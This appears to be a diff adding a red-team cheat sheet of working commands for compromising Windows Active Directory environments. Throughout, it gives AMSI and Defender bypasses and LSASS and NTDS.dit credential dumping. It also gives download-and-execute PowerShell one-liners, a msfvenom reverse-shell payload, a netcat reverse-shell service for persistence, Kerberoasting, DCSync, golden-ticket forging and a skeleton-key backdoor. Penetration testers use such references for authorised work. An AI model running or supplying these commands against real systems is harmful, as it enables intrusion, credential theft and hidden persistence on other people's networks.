@@ -1,0 +1,276 @@
+GhostPack Tools
+  Seatbelt.exe system|user (Opsec Tool)
+  SharpUp.exe (Privesc Tool)
+  SharpDump.exe (LSASS MiniDump Tool)
+  SharpView.exe (Network Enumeration) (Use module -Help to get syntax)
+    - Exmaple: SharpView.exe Get-NetLoggedon localhost
+    - PowerView Examples: https://powersploit.readthedocs.io/en/latest/Recon
+  SharpHound.exe -c All,Loggedon [-s|-d] --Throttle 20 --Jitter 7 --NoSaveCache --RandomFilenames --EncryptZip
+  Rubeus.exe (Kerberose Tool)
+  SharpDPAPI.exe
+    - SharpDPAPI backupkey /server:dc01.fqdn /file:keyname.pvk (file is optional; base64 without)
+    - SharpDPAPI traiage /pvk:key.pvk or /pvk:Base64
+    - SharpDPAPI machinetriage (must be system)
+  AMSIBypass - Rastamouse
+    - [System.Reflection.Assembly]::LoadFile("D:\Tools\ASBBypass\ASBBypass\bin\Release\ASBBypass.dll")
+    - [Amsi]::Bypass()
+    
+Bloodhound/Neo4J
+  # FIND SPN WITH DOMAIN ADMIN
+  MATCH (u:User {hasspn: true})
+  MATCH (G:Group {name: 'DOMAIN ADMINS@DOMAIN.COM'})
+  MATCH p = shortestPath ((u)-[*1..]->(g))
+  RETURN u.name,LENGTH(P)
+  ORDER BY LENGTH(p) ASC
+
+  # FIND SPN ORDER BY ADMIN ACCESS
+  MATCH (u: User {hasspn: true})
+  OPTIONAL MATCH (u)-[:AdminTo]->(c1:Computer)
+  OPTIONAL MATCH (u)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer)
+  WITH u,COLLECT(c1) + COLLECT(c2) AS tempVar
+  UNWIND tempVar AS comps
+  RETURN u.name,COUNT(DISTINCT(comps))
+  ORDER BY COUNT(DISTINCT(comps)) DESC
+  
+Antivirus Info
+  WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
+  
+PowerView
+  Trusts: Get-DomainTrust -SearchBase “GC://$($ENV:USERDNSDOMAIN)”
+  Trust Mapping: Get-DomainTrustMapping to | Export-CSV -NoTypeInformation trusts.csv
+  Change User PW: powerpick $newpwd = ConvertTo-SecureString -String "Password1!" -AsPlainText –Force; Set-DomainUserPassword -Identity <username> -AccountPassword $newpwd
+  Change ACL Perms: Add-DomainObjectAcl -TargetIdentity <domain|user|computer> -PrincipalIdentity <user|computer> -Rights <DCSync|All> -Verbose
+
+Password Crack Examples
+  JTR: john --format=netntlmv2 --wordlist=/usr/share/wordlist/rockyou hash_file.txt
+  HASHCAT: Hashcat -a0 -w3 -m1000 /path/to/hashes /path/to/dictionary [-r rules file]
+    * a = dictionary attack; w3 = almost all processing hardware; m = hash type - 1000 is NTLM
+
+MSBuild Beacon
+  MSBuild 3gStudent:
+    Download XML from: https://github.com/3gstudent/msbuild-inline-task
+    Generate Shellcode from Cobalt (C#) and place the shellcode in the XML from new_byte...};
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml
+  Powershell IEX
+    "powershell iex (new-object net.webclient).downloadstring('http://10.10.10.10/update')"
+    
+  MSBuild NPS 
+    Genereate XML using script from https://github.com/trustedsec/nps_payload
+    Create cobalt listener
+    Disable AMSI on target
+    Upload XML to target or Run XML from File Server
+    Execute %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe c:\windows\temp\msbuild_nps.xml
+
+Remote Execute
+  CrackMapExec
+    crackmapexec IP_Address -u username -p='password' (Test if you have access)
+    crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
+      - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
+    crackmapexec IP -u username -H hash
+  Impacket 
+    python /usr/share/doc/python-impacket/examples/wmiexec.py username:password@10.10.5.11 'cmd /c ipconfig'
+      - wmiexec.py, psexec.py, dcomexec.py, atexec.py (Same syntax as above)
+      - smbexec.py (Attempts to get a shell on the remote system; no command argument)
+    
+  LolBin
+    runas /netonly /user:domain\username powershell.exe
+    wmic /node:10.0.0.6 /user:administrator process call create "powershell.exe iex (new-object net.webclient).downloadstring('http://10.10.5.10/update')"
+    schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
+    * COPY ANY SYSTEM FILE
+      C:\windows\system32\esentutl.exe /y <source-file> /vss /d <dest-file>
+      
+Apache Tomcat JServ exploit
+    https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/
+    Install the Dependencies on attack box
+        apt install libapache2-mod-jk a2enmod proxy_ajp
+    Configure Apache
+        ProxyRequests Off
+        # Only allow localhost to proxy requests
+        <Proxy *>
+        Order deny,allow
+        Deny from all
+        Allow from localhost
+        </Proxy>
+        # Change the IP address in the below lines to the remote servers IP address hosting the Tomcat instance
+        ProxyPass   / ajp://192.168.109.134:8009/
+        ProxyPassReverse   / ajp://192.168.109.134:8009/
+    Start Apache
+        systemctl start apache2
+    Exploit
+        msfvenom -p java/shell_reverse_tcp LHOST=192.168.109.129 LPORT=4444 -f war > shell3.war
+    Start Listener
+    Once uploaded make sure to visit the malicious URL (available in applications list) at least once to cause the WAR to execute.
+  
+Metasploit Pro Exploits
+  Windows Escalate UAC Protection Bypass
+      Scheduled Tasks Microsoft\Windows\DiskCleanup run with higest prividleges
+      Change %windir% environment variable to a folder with your payload
+
+  DCOM Exec
+      https://ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model
+      Remote DCOM command execution using credentials
+
+SCF Hash Collection
+    Create a scf file extension with the following contents in a Windows File Share:
+        [Shell]
+        Command=2
+        IconFile=\\192.168.0.12\share\test.ico
+        [Taskbar]
+        Command=ToggleDesktop
+    Start responder: responder -wrf --lm -v -I eth0
+
+File Share
+  WebDav (Host File over port 80)
+    pip install wsgidav cheroot
+    wsgidav --host=0.0.0.0 --port=80 --root=/tmp
+  SMB Share
+    smbserver.py sharename -smb2support directory path (ie. python smbserver.py -smb2support poop /tmp)
+      - copy files: xcopy \\10.10.10.14\poop\filename.exe
+  
+Net Commands
+  shell net user username /domain (query domain user)
+  shell net user username password /domain /add (Add User)
+  shell net group "Domain Admins" /domain
+  shell net group "Domain Admins" username /add /domain
+  
+Overpass the Hash
+  dcsync fqdn domain\user (User must have DCSync rights in that domain)
+  dcsync fqdn domain\krbtgt (golden ticket)
+  dcsync fqdn (dump entire domain hashes)
+  Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
+
+PrivEsc
+  Kerberoast (Request SPN and get the TGS for offline cracking)
+    Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
+      Hashcat -a0 -w3 -m 13100 /path/to/hashes /path/to/dictionary [-r rules file]
+    -OR-
+    SharpView.exe Invoke-Kerberoast (optional: -Domain:dom.fqdn -Server:DC.fqdn)
+    Rubeus.exe /tgtdeleg /user:sqlservice (<-SamAccountName)
+
+  MiniDump - Offline PW dump
+    .\createminidump.exe
+    .\mimikatz.exe
+    sekurlsa::minidump c:\temp\lsass.dmp
+    sekurlsa::logonpasswords
+    
+  Dump DC NTDS.dit
+    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+    /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
+    crackmapexec can dump NTDS.dit
+    
+  Printer Bug (Get DC TGT from Unconstrained Delegation machine)
+      Rubeus monitor /interval:1 (monitors for TGT when spoolsample is run)
+      Spoolsample.exe DC01.FQDN Host_running_rubeus.fqdn
+      Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIB... (should not have valid TGT in memory)
+
+  Schedule Tasks/Trusted Installer
+    https://tyranidslair.blogspot.com/2019/09/the-art-of-becoming-trustedinstaller.html?m=1
+      $a = New-ScheduledTaskAction -Execute notepad.exe
+      Register-ScheduledTask -TaskName 'TestTask' -Action $a
+      $svc = New-Object -ComObject 'Schedule.Service'
+      $svc.Connect()
+      $user = 'NT SERVICE\TrustedInstaller'
+      $folder = $svc.GetFolder('\')
+      $task = $folder.GetTask('TestTask')
+      $task.RunEx($null, 0, 0, $user)
+      
+  PowerPriv - Get DCSync rights from any user with a mailbox
+    Link: http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html
+    Download Poweshell PS1: https://github.com/G0ldenGunSec/PowerPriv
+    Compromised Beacon: Powershell-Import /path/powerPriv.ps1
+    Compromised Beacon: socks 36529
+    Compromised Beacon: rportfwd 80 127.0.0.1 80
+    Kali: Verify /etc/proxychains.conf port matches socks above
+    Kali: proxychains ntlmrelayx -t ldap://DC_IP --escalate-user username (-attackerPort 8080)
+    Compromised Beacon: powershell PowerPriv -targetHost Exchange_IP -attackerHost Beacon_IP (may be internal IP)
+    dcsync fqdn dom\user
+   
+  PrivExchange - Get DCSync rights from any user with a mailbox
+    https://github.com/dirkjanm/privexchange
+    ## Modify the httattack.py script and change "attacker_url = 'http://dev.testsegment.local/myattackerurl/'" to the url of the attack box running ntlxrelayx 
+    ntlmrelayx.py -t ldap://fqdn.domain_controller --escalate-user <domain_user_name>
+    python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
+    
+  Multi-Domain (Forrest) compromise usiing Sid History
+    Trust Commands
+      nltest /domain_trusts (view domain trusts)
+      Get-DomainTrust (view domain trust permissions)
+    SID History (Child -> Parent)
+      Add Enterprise Admin to the SID history of a user to gain access to the forrest root
+        https://adsecurity.org/?p=1640
+      mimikatz kerberos::golden </admin:Administrator|/user:DC_compname$> /domain:domain.fqdn /sid:current_domain_sid /sids:parent_domain_Sid..-519 /krbtgt:krbtgt_hash /startoffset:0 /endin:600 /renewmax:10080 /ptt
+    Spool Sample (Forest -> Forest / Domain -> Domain)
+      Force a DC in another forrest to send its TGT to you and extract it to run DCSync
+        https://www.youtube.com/watch?v=NNoQGA9G7BU
+        https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
+      SpoolSample_v4.5_x64.exe DC01.forrestA DC02.forrestB (forrest A is the target domain and returns its Computer hash)
+      Rubeus monitor /interval:5 /filteruser:DC01$
+        - Copy Kerberose ticket and put into single line. Verify ticket with Rubeus describe /ticket:5hsR4s....
+      Rubeus ptt /ticket:5hsR4s.... (This injects the ticket into the LSA)
+      DCSync DC01.forrestA
+    Trust Tickets (Forest -> Forest / Domain -> Domain)
+        https://adsecurity.org/?p=1588
+        https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/
+      GET Trusts Hash
+      hashdump and look for account ending in $ which is not a computer account. This is the trust password. (Changes every 30 days)
+      dcsync current_domain_fqdn current_dom\target_domain$ (example: dcsync admin.offshore.com admin\client$)
+      External Trusts
+        mimikatz kerberos::golden /domain:domain.fqdn /sid:current_domain_sid /rc4:NTLM_Trust_Hash /user:Administrator /service:krbtgt /target:target_domain_fqdn /ticket:file.kirbi
+          - Save file.kirbi -> used for next command to get TGS in target domain
+        mimikatz asktgs C:\path\file.kirbi cifs/dc01.target.domain
+      Internal Trusts
+        mimikatz lsadump::trust /patch
+        mimikatz kerberos::golden /domain:domain.fqdn /sid:current_domain_sid /sids:target_domain_sid-519 /rc4:NTLM_Trust_Hash /user:Administrator /service:krbtgt  /target:target_domain_fqdn /ticket:file.kirbi
+        mimikatz asktgs C:\path\file.kirbi cifs/dc01.target.domain
+        mimikatz kirbikator lsa file.kirbi
+    
+Persistance
+  schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
+  sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
+    sc start evilsvc
+  reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 1 /d "C:\temp\evil.exe|dll"
+
+  # Mimikatz Skeleton Key (default master password is mimikatz)
+    mimikatz misc::skeleton
+      - Once done; make_token dom\username mimikatz
+  
+Windows Commands
+  Secure Delete
+    cipher /w:C:\path-to-directory
+    
+  runas /netonly /user:[username] powershell.exe
+    wmic.exe /node:[dst-ip] process call create "powershelle.exe whoami"
+    psexec.exe \\IP-Addr -i -s cmd.exe (-s runs as System)
+
+  Disable/Enable UAC Command Line
+      Disable: reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+      Enable:  reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+
+  Modify Defender
+    https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=win10-ps
+      Powershell Set-MpPreference -DisableRealtimeMonitoring $true ($false turns it on)
+      Powershell Add-MpPreference -ExclusionPath "C:\Temp" (Excludes a folder)
+      Powershell Set-MpPreference -DisableScriptScanning 1 (Disable AMSI; set to 0 to enable)
+        Example: impacket-wmiexec Administrator:'password'@10.10.10.10 "Powershell.exe .('{3}{2}{4}{1}{0}'-f 'e','nc','Prefe','Set-Mp','re') -DisableScriptScanning 1"
+      
+  Opens Powershell as Administrator
+      Start-Process PowerShell -Verb RunAs
+
+  Procdump (lsass.exe)
+      procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp
+      mimikatz.exe (Copied from Kali to Windows)
+          sekurlsa::minidump C:\Windows\Temp\lsass.dmp
+          sekurlsa::LogonPasswords
+
+  Set User Password
+      Domain: $newpwd = ConvertTo-SecureString -String "Password1!" -AsPlainText –Force; Set-DomainUserPassword -Identity [username] -AccountPassword $newpwd
+      PSCredential: $username = 'domain\username'; $newpwd = ConvertTo-SecureString -String "Password1!" -AsPlainText –Force; $MyCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username,$newpwd
+          gwmi win32_service -credential $MyCreds -computer 192.168.5.17
+  
+  Powershell Search
+    Find files with passwords in contencts of TXT and LOG Files
+      ls -r -d 2 -i *.txt,*.log c:\path | sls -patt 'pass' | select Line, Path (or Out-File ./file.txt)
+    Files last write time in the last 30 days.
+      ls -r -d 2 -i *pass* c:\path | ? {$_.LastWriteTime -lt (Get-Date).AddDays(-30)} | select LastWriteTime, FullName | epcsv -NotypeInformation ./test.csv
+    Powershell Console Logs
+      gc "C:\Users\<username>\Application Data\microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
